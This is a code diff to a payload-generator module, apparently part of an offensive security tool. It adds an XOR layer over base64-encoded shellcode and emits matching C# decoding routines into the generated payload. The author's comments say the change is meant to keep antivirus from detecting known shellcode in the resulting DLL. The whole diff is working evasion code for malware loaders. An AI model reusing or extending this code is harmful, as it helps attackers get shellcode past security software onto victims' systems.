@@ -68,7 +68,14 @@ class PayloadModule:
         # Base64 encode the shellcode
         Shellcode = "0" + ",0".join(Shellcode.split("\\")[1:])
         Shellcode = base64.b64encode(bytes(Shellcode, 'latin-1')).decode('ascii')
-
+        Output = ""
+        #######################################
+        #XOR ENCODING - WHEELSVT 2020-04
+        for i in range(len(Shellcode)):
+            current = Shellcode[i]
+            Output += chr(ord(current) ^ ord("1"))
+        Shellcode = base64.b64encode(bytes(Output, 'latin-1')).decode('ascii')
+        #######################################
         # randomize all our variable names, yo'
         className = bypass_helpers.randomString()
         classNameTwo = bypass_helpers.randomString()
@@ -118,7 +125,16 @@ class PayloadModule:
         payload_code = payload_code + payload_code2
         num_tabs_required += 3
 
-        payload_code += '\t' * num_tabs_required + "string %s = System.Text.ASCIIEncoding.ASCII.GetString(Convert.FromBase64String(\"%s\"));\n" % (bytearrayName, Shellcode)
+        #WHEELSVT Adding XOR encoding of raw shellcode as an extra precaution
+        #Found that AV may pick up on one step B64 of known shellcode which is present in the resulting DLL
+        #Not using a random variable name here though... and static XOR key of '1' as a POC.
+        payload_code += '\t' * num_tabs_required + "string ord = System.Text.ASCIIEncoding.ASCII.GetString(Convert.FromBase64String(\"%s\"));\n" % (Shellcode)
+        payload_code += '\t' * num_tabs_required + "char key = '1';\n"
+        payload_code += '\t' * num_tabs_required + "string output = \"\";\n"
+        payload_code += '\t' * num_tabs_required + "for (int i = 0; i<ord.Length; i++)\n"
+        payload_code += '\t' * num_tabs_required + "\toutput = output + char.ToString((char)(ord[i] ^ key));\n"
+        #End WheelsVT edit - pull from the output variable instead of the original shellcode
+        payload_code += '\t' * num_tabs_required + "string %s = System.Text.ASCIIEncoding.ASCII.GetString(Convert.FromBase64String(output));\n" % (bytearrayName)
         payload_code += '\t' * num_tabs_required + "string[] chars = %s.Split(',').ToArray();\n" %(bytearrayName)
         payload_code += '\t' * num_tabs_required + "byte[] %s = new byte[chars.Length];\n" %(shellcodeName)
         payload_code += '\t' * num_tabs_required + "for (int i = 0; i < chars.Length; ++i) { %s[i] = Convert.ToByte(chars[i], 16); }\n"  %(shellcodeName)
